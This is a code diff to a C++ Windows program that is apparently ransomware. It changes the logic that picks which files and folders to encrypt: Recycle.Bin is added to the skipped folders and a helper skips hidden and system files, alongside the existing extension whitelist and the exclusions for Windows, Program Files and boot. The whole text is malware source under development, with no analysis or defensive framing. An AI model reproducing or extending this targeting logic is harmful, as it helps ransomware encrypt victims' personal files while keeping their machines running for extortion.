@@ -42,7 +42,7 @@ bool do_encrypt(const string& path)
 	std::string ext = find_extension(path);
 	try
 	{
-		return (ext_whitelist.find(ext) != ext_whitelist.end()) && (file_size(path) < MAX_FILE_SIZE);
+		return (ext_whitelist.find(ext) != ext_whitelist.end()) && (file_size(path) < MAX_FILE_SIZE) && ! hasNonEncryptAttribute(path);
 	}
 	catch(...)
 	{
@@ -59,7 +59,7 @@ bool do_decrypt(const string& path)
 bool is_valid_folder(const string& path)
 {
 	static std::unordered_set<string> unvalid_folder = {
-		"Windows", "Program Files", "boot"
+		"Windows", "Program Files", "boot", "Recycle.Bin"
 	};
 	for (auto folder : unvalid_folder)
 	{
@@ -68,7 +68,7 @@ bool is_valid_folder(const string& path)
 			return false;
 		}
 	}
-	return true;
+	return !hasNonEncryptAttribute(path);
 }
 
 
@@ -229,4 +229,10 @@ bool getLinkTarget(const char linkFileName[], char targetPath[], int size)
 			return false;
 	}
 	return false;
+}
+
+bool hasNonEncryptAttribute(string path)
+{
+	DWORD attributes = GetFileAttributes(path.c_str());
+	return attributes & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 }
